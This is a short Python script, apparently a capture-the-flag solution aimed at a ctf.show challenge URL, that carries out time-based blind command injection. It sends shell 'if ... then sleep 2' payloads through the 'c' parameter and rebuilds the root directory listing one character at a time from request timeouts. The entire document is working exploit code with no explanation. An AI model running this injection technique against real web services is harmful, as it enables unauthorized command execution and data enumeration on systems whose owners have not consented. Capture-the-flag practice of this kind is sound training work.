import requests  
url = "http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/"  
result = ""  
for i in range(1,5):  
    for j in range(1,15):  
        #ascii码表  
        for k in range(32,128):  
            k=chr(k)  
            payload = "?c=" + f"if [ `ls / | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"  
            try:  
                requests.get(url=url+payload, timeout=(1.5,1.5))  
            except:  
                result = result + k  
                print(result)  
                break  
    result += " "
```

